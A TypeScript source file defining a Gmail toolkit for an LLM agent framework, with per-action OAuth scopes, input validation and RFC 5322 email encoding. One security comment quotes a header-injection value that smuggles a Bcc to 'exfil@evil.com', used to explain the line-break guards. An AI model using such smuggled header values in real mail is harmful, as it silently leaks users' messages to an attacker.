/**
 * The `gmail` toolkit (§14). The second toolkit on the same `google` provider —
 * it proves the toolkit split, the shared connection, and incremental consent.
 * Scopes are deliberately per-action (search → readonly, send → send, drafts →
 * compose, labels → modify): a single toolkit scope would over-grant them all.
 */
import { z } from 'zod';
import { defineToolkit, httpAction } from '../../core/authoring';
import { GOOGLE_SCOPES } from './provider';

const GMAIL = '/gmail/v1/users/me';
const boundedId=z.string().min(1).max(256);
const messageRef=z.object({id:boundedId,threadId:boundedId.optional()});
type MailPart={mimeType?:string;filename?:string;headers?:{name:string;value:string}[];body?:{data?:string;attachmentId?:string;size?:number};parts?:MailPart[]};
const mailPart:z.ZodType<MailPart>=z.lazy(()=>z.object({mimeType:z.string().max(200).optional(),filename:z.string().max(1000).optional(),headers:z.array(z.object({name:z.string().max(200),value:z.string().max(20000)})).max(200).optional(),body:z.object({data:z.string().max(8*1024*1024).optional(),attachmentId:boundedId.optional(),size:z.number().int().nonnegative().optional()}).optional(),parts:z.array(mailPart).max(100).optional()}));
const fullMessage=z.object({id:boundedId,threadId:boundedId.optional(),historyId:z.string().max(128).optional(),internalDate:z.string().max(32).optional(),snippet:z.string().max(5000).optional(),labelIds:z.array(z.string().max(128)).max(100).optional(),payload:mailPart.optional(),sizeEstimate:z.number().int().nonnegative().optional()});
function boundedMail(raw:unknown){let nodes=0;const walk=(part:unknown,depth=0)=>{if(depth>30||++nodes>20000)throw new Error('Gmail response exceeds its structural limit');if(part&&typeof part==='object')for(const value of Object.values(part))walk(value,depth+1);};if(Buffer.byteLength(JSON.stringify(raw))>10*1024*1024)throw new Error('Gmail response exceeds its byte limit');walk(raw);return raw;}

const hasNonAscii = (s: string): boolean => /[^\x00-\x7F]/.test(s);
const hasLineBreak = (s: string): boolean => /[\r\n]/.test(s);

// Loose but practical address check — bare addresses only (no display names/angle brackets).
const EMAIL_RE = /^[^\s@,<>]+@[^\s@,<>]+\.[^\s@,<>]+$/;
const isEmailList = (s: string): boolean =>
  s.split(',').map((p) => p.trim()).filter(Boolean).length > 0 &&
  s.split(',').map((p) => p.trim()).filter(Boolean).every((p) => EMAIL_RE.test(p));

/**
 * Header-injection guards (security). `to`/`cc`/`bcc`/`subject` are LLM-controlled
 * and interpolated into RFC 5322 header lines, so a CR/LF would inject a header or
 * an alternate body (e.g. a `subject` of `"Hi\r\nBcc: exfil@evil.com"`). Recipients
 * must be bare addresses; every header value must be single-line. Enforced in the
 * Zod schema (→ `invalid_input`, before execute) AND defended again in `encodeEmail`.
 */
const recipientField = z
  .string()
  .refine((s) => !hasLineBreak(s), 'recipients must not contain line breaks')
  .refine(isEmailList, 'must be a valid email address or comma-separated list of addresses');
const subjectField = z.string().refine((s) => !hasLineBreak(s), 'subject must not contain line breaks');
/**
 * The RFC Message-ID of the message being replied to (e.g. "<abc@mail.gmail.com>"). Interpolated
 * into the `In-Reply-To`/`References` header lines, so it carries the same single-line
 * header-injection guard as every other header value.
 */
const inReplyToField = z.string().refine((s) => !hasLineBreak(s), 'inReplyTo must not contain line breaks');
/**
 * The `References` header of the message being replied to — a space-separated chain of the ancestor
 * Message-IDs, oldest first. We append `inReplyTo` to it so the reply carries the full thread ancestry
 * (deep replies stay correctly nested in strict RFC 5322 clients). Optional: omit for a simple one-hop
 * reply, where `References` falls back to just `inReplyTo`. Same single-line header-injection guard.
 */
const referencesField = z.string().refine((s) => !hasLineBreak(s), 'references must not contain line breaks');

/** RFC 2047-encode a header value when it carries non-ASCII bytes (e.g. a unicode subject). */
function encodeHeaderWord(value: string): string {
  return hasNonAscii(value) ? `=?UTF-8?B?${Buffer.from(value, 'utf8').toString('base64')}?=` : value;
}

/** Build a minimal RFC 5322 message and base64url-encode it for the Gmail API. */
export function encodeEmail(input: {
  to: string;
  subject: string;
  body: string;
  cc?: string;
  bcc?: string;
  inReplyTo?: string;
  references?: string;
}): string {
  // Defense in depth — schemas already reject these, but a header value must never break out.
  for (const [name, value] of [
    ['To', input.to],
    ['Cc', input.cc],
    ['Bcc', input.bcc],
    ['Subject', input.subject],
    ['In-Reply-To', input.inReplyTo],
    ['References', input.references],
  ] as const) {
    if (value && hasLineBreak(value)) throw new Error(`mail header "${name}" contains a line break`);
  }
  // References = the parent's own chain (if the caller passed it) followed by the parent's Message-ID.
  // With no `references` this is just `inReplyTo`, identical to a plain one-hop reply.
  const references = [input.references, input.inReplyTo].filter(Boolean).join(' ');
  const headers = [
    `To: ${input.to}`,
    input.cc ? `Cc: ${input.cc}` : null,
    input.bcc ? `Bcc: ${input.bcc}` : null,
    `Subject: ${encodeHeaderWord(input.subject)}`,
    // Reply threading: In-Reply-To points at the immediate parent's Message-ID; References carries the
    // whole ancestor chain (parent's References + parent's Message-ID) so Gmail — and every RFC 5322
    // client — nests this message in that conversation. The Gmail API ALSO needs the numeric threadId on
    // the request body; the create_draft / send_email actions set it.
    input.inReplyTo ? `In-Reply-To: ${input.inReplyTo}` : null,
    references ? `References: ${references}` : null,
    'MIME-Version: 1.0',
    'Content-Type: text/plain; charset="UTF-8"',
    'Content-Transfer-Encoding: base64',
  ].filter((h): h is string => h !== null);
  // base64-encode the body so any UTF-8 bytes are carried safely (7bit was wrong for non-ASCII);
  // wrap at 76 columns per RFC 2045.
  const body = (Buffer.from(input.body, 'utf8').toString('base64').match(/.{1,76}/g) ?? []).join('\r\n');
  const raw = `${headers.join('\r\n')}\r\n\r\n${body}`;
  return Buffer.from(raw, 'utf8').toString('base64url');
}

interface GmailPayload {
  mimeType?: string;
  headers?: Array<{ name?: string; value?: string }>;
  body?: { data?: string; size?: number };
  parts?: GmailPayload[];
}

interface RawMessage {
  id?: string;
  threadId?: string;
  snippet?: string;
  labelIds?: string[];
  payload?: GmailPayload;
}

const WANTED_HEADERS = ['From', 'To', 'Cc', 'Bcc', 'Subject', 'Date', 'Message-ID', 'References'];

function extractHeaders(p?: GmailPayload): Record<string, string> | undefined {
  const out: Record<string, string> = {};
  for (const h of p?.headers ?? []) {
    if (h.name && h.value !== undefined && WANTED_HEADERS.includes(h.name)) out[h.name] = h.value;
  }
  return Object.keys(out).length ? out : undefined;
}

function extractPlainText(p?: GmailPayload): string | undefined {
  if (!p) return undefined;
  if ((p.mimeType ?? '').startsWith('text/plain') && p.body?.data) {
    try {
      return Buffer.from(p.body.data, 'base64url').toString('utf8');
    } catch {
      return undefined;
    }
  }
  for (const part of p.parts ?? []) {
    const t = extractPlainText(part);
    if (t) return t;
  }
  return undefined;
}

export const gmail = defineToolkit({
  id: 'gmail',
  providerId: 'google',
  displayName: 'Gmail',
  // `scopes` (the upfront-consent bundle) defaults to the union of the actions' scopes
  // (§3). Declaring it by hand drifts — it previously omitted gmail.compose, so a
  // full-toolkit connect could never create a draft (P2-b). Let `defineToolkit` derive it.
  actions: [
    httpAction({
      id: 'gmail.search_messages',
      description: 'Search messages with a Gmail query (e.g. "from:alice is:unread").',
      scopes: [GOOGLE_SCOPES.gmailReadonly],
      input: z.object({
        query: z.string().describe('Gmail search query'),
        maxResults: z.number().int().positive().max(100).default(20),
        pageToken: z.string().max(2000).optional(),
      }),
      request: (i) => ({ method: 'GET', path: `${GMAIL}/messages`, query: { q: i.query, maxResults: i.maxResults, pageToken:i.pageToken } }),
      output: (raw) => {
        const r = z.object({messages:z.array(messageRef).max(100).optional(),resultSizeEstimate:z.number().int().nonnegative().optional(),nextPageToken:z.string().max(2000).optional()}).parse(boundedMail(raw));
        return {
          messages: (r.messages ?? []).map((m) => ({ id: m.id, threadId: m.threadId })),
          estimate: r.resultSizeEstimate ?? 0,
          ...(r.nextPageToken?{nextPageToken:r.nextPageToken}:{}),
        };
      },
    }),

    httpAction({id:'gmail.get_profile',description:'Read the mailbox history checkpoint.',scopes:[GOOGLE_SCOPES.gmailReadonly],input:z.object({}).strict(),request:()=>({method:'GET',path:`${GMAIL}/profile`}),output:raw=>z.object({emailAddress:z.string().max(320),historyId:z.string().max(128),messagesTotal:z.number().int().nonnegative().optional(),threadsTotal:z.number().int().nonnegative().optional()}).parse(boundedMail(raw))}),
    httpAction({id:'gmail.read_message',description:'Read a full message with bounded MIME parts and attachment references.',scopes:[GOOGLE_SCOPES.gmailReadonly],input:z.object({messageId:boundedId}).strict(),request:i=>({method:'GET',path:`${GMAIL}/messages/${encodeURIComponent(i.messageId)}`,query:{format:'full'}}),output:raw=>fullMessage.parse(boundedMail(raw))}),
    httpAction({id:'gmail.get_attachment',description:'Read one message attachment as bounded base64url data.',scopes:[GOOGLE_SCOPES.gmailReadonly],input:z.object({messageId:boundedId,attachmentId:boundedId}).strict(),request:i=>({method:'GET',path:`${GMAIL}/messages/${encodeURIComponent(i.messageId)}/attachments/${encodeURIComponent(i.attachmentId)}`}),output:raw=>z.object({data:z.string().max(8*1024*1024),size:z.number().int().nonnegative().max(6*1024*1024)}).parse(boundedMail(raw))}),
    httpAction({id:'gmail.list_history',description:'Read one bounded page of mailbox changes after a checkpoint.',scopes:[GOOGLE_SCOPES.gmailReadonly],input:z.object({startHistoryId:z.string().regex(/^\d+$/).max(128),pageToken:z.string().max(2000).optional(),maxResults:z.number().int().min(1).max(100).default(100)}).strict(),request:i=>({method:'GET',path:`${GMAIL}/history`,query:{startHistoryId:i.startHistoryId,pageToken:i.pageToken,maxResults:i.maxResults,historyTypes:'messageAdded'}}),output:raw=>z.object({historyId:z.string().max(128),nextPageToken:z.string().max(2000).optional(),history:z.array(z.object({id:z.string().max(128),messages:z.array(messageRef).max(1000).optional(),messagesAdded:z.array(z.object({message:messageRef})).max(1000).optional(),messagesDeleted:z.array(z.object({message:messageRef})).max(1000).optional()})).max(100).optional()}).parse(boundedMail(raw))}),

    httpAction({
      id: 'gmail.get_message',
      description: 'Get a message by id (metadata + snippet).',
      scopes: [GOOGLE_SCOPES.gmailReadonly],
      input: z.object({
        messageId: z.string(),
        format: z.enum(['full', 'metadata', 'minimal']).default('metadata'),
      }),
      request: (i) => ({ method: 'GET', path: `${GMAIL}/messages/${encodeURIComponent(i.messageId)}`, query: { format: i.format } }),
      // `format` is now honored: 'metadata'/'full' surface the parsed headers; 'full' also
      // includes the decoded plain-text body. 'minimal' returns no payload, so neither appears.
      output: (raw) => {
        const m = raw as RawMessage;
        const headers = extractHeaders(m.payload);
        const text = extractPlainText(m.payload);
        return {
          id: m.id,
          threadId: m.threadId,
          snippet: m.snippet,
          labelIds: m.labelIds ?? [],
          ...(headers ? { headers } : {}),
          ...(text ? { text } : {}),
        };
      },
    }),

    httpAction({
      id: 'gmail.create_draft',
      description:
        'Create a draft email (does not send). To draft a reply that threads inside an existing ' +
        'conversation, pass threadId AND inReplyTo — read both off the message being replied to via ' +
        'get_message (its threadId and headers["Message-ID"]). For a deep reply, also pass references ' +
        '(its headers["References"]) to preserve the full thread ancestry.',
      mutating: true,
      risk: 'medium',
      scopes: [GOOGLE_SCOPES.gmailCompose],
      input: z.object({
        to: recipientField,
        subject: subjectField,
        body: z.string(),
        cc: recipientField.optional(),
        threadId: z
          .string()
          .optional()
          .describe('Gmail thread id to attach this draft to, so it nests as a reply. Pair with inReplyTo.'),
        inReplyTo: inReplyToField
          .optional()
          .describe(
            'RFC Message-ID header of the message being replied to (from get_message headers["Message-ID"]). ' +
              'Sets In-Reply-To/References so the reply threads correctly.',
          ),
        references: referencesField
          .optional()
          .describe(
            'The References header of the message being replied to (from get_message headers["References"]). ' +
              'Optional — prepended to the reply\'s References chain so a deep reply keeps full thread ancestry.',
          ),
      }),
      request: (i) => ({
        method: 'POST',
        path: `${GMAIL}/drafts`,
        body: { message: { raw: encodeEmail(i), ...(i.threadId ? { threadId: i.threadId } : {}) } },
      }),
      output: (raw) => {
        const r = raw as { id?: string; message?: RawMessage };
        return { draftId: r.id, messageId: r.message?.id, threadId: r.message?.threadId };
      },
    }),

    httpAction({
      id: 'gmail.send_email',
      description:
        'Send an email from the connected account. To reply within an existing thread, pass threadId ' +
        'AND inReplyTo (from get_message on the message being replied to). For a deep reply, also pass ' +
        'references (its headers["References"]) to preserve the full thread ancestry.',
      mutating: true,
      risk: 'high',
      scopes: [GOOGLE_SCOPES.gmailSend],
      input: z.object({
        to: recipientField,
        subject: subjectField,
        body: z.string(),
        cc: recipientField.optional(),
        bcc: recipientField.optional(),
        threadId: z
          .string()
          .optional()
          .describe('Gmail thread id to send this reply into, so it nests in that conversation. Pair with inReplyTo.'),
        inReplyTo: inReplyToField
          .optional()
          .describe('RFC Message-ID header of the message being replied to; sets In-Reply-To/References.'),
        references: referencesField
          .optional()
          .describe(
            'The References header of the message being replied to (from get_message headers["References"]). ' +
              'Optional — prepended to the reply\'s References chain so a deep reply keeps full thread ancestry.',
          ),
      }),
      request: (i) => ({
        method: 'POST',
        path: `${GMAIL}/messages/send`,
        body: { raw: encodeEmail(i), ...(i.threadId ? { threadId: i.threadId } : {}) },
      }),
      output: (raw) => {
        const m = raw as RawMessage;
        return { id: m.id, threadId: m.threadId };
      },
    }),

    httpAction({
      id: 'gmail.modify_labels',
      description: 'Add and/or remove labels on a message.',
      mutating: true,
      risk: 'medium',
      scopes: [GOOGLE_SCOPES.gmailModify],
      input: z.object({
        messageId: z.string(),
        addLabelIds: z.array(z.string()).default([]),
        removeLabelIds: z.array(z.string()).default([]),
      }),
      request: (i) => ({
        method: 'POST',
        path: `${GMAIL}/messages/${encodeURIComponent(i.messageId)}/modify`,
        body: { addLabelIds: i.addLabelIds, removeLabelIds: i.removeLabelIds },
      }),
      output: (raw) => {
        const m = raw as RawMessage;
        return { id: m.id, labelIds: m.labelIds ?? [] };
      },
    }),

    httpAction({
      id: 'gmail.list_drafts',
      description:
        'List draft ids, each with its message id and thread id. Use it to find a draft to delete — ' +
        'delete_draft needs the draftId, which search_messages does not return. Optional `query` filters ' +
        'with Gmail search syntax.',
      scopes: [GOOGLE_SCOPES.gmailCompose],
      input: z.object({
        maxResults: z.number().int().positive().max(100).default(20),
        query: z.string().optional().describe('Gmail search query to filter drafts (e.g. "to:alice@example.com").'),
        pageToken: z.string().optional(),
      }),
      request: (i) => ({
        method: 'GET',
        path: `${GMAIL}/drafts`,
        query: {
          maxResults: i.maxResults,
          ...(i.query ? { q: i.query } : {}),
          ...(i.pageToken ? { pageToken: i.pageToken } : {}),
        },
      }),
      output: (raw) => {
        const r = raw as {
          drafts?: Array<{ id?: string; message?: RawMessage }>;
          nextPageToken?: string;
          resultSizeEstimate?: number;
        };
        return {
          drafts: (r.drafts ?? []).map((d) => ({
            draftId: d.id,
            messageId: d.message?.id,
            threadId: d.message?.threadId,
          })),
          ...(r.nextPageToken ? { nextPageToken: r.nextPageToken } : {}),
          estimate: r.resultSizeEstimate ?? 0,
        };
      },
    }),

    httpAction({
      id: 'gmail.delete_draft',
      description: 'Permanently delete a draft by its draftId (from list_drafts). Only affects the draft, never sent mail.',
      mutating: true,
      risk: 'medium',
      scopes: [GOOGLE_SCOPES.gmailCompose],
      input: z.object({
        draftId: z.string(),
      }),
      request: (i) => ({ method: 'DELETE', path: `${GMAIL}/drafts/${encodeURIComponent(i.draftId)}` }),
      output: () => ({ ok: true }),
    }),
  ],
});
